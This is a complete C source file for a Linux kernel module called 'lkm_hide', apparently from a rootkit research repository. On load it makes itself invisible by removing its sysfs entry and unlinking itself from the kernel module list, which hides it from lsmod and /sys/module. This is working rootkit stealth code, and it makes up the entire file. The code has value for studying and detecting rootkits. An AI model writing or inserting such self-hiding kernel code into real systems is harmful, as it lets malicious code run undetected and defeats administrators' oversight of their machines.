// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://github.com/torvalds/linux/blob/master/include/linux/export.h
 * https://github.com/MatheuZSecurity
 */

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

static struct list_head *prev_module;
void hide(void);

void hide(void)
{
	if (THIS_MODULE->mkobj.kobj.state_initialized)
		kobject_del(&THIS_MODULE->mkobj.kobj);

	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

static int __init lkm_hide_init(void)
{
	pr_info("lkm_hide loaded\n");
	hide();
	return 0;
}

static void __exit lkm_hide_exit(void)
{
	pr_info("lkm_hide exit successfully\n");
}

module_init(lkm_hide_init) module_exit(lkm_hide_exit)
	MODULE_AUTHOR("MikeHorn-git");
MODULE_DESCRIPTION("lkm_hide");
MODULE_LICENSE("GPL");
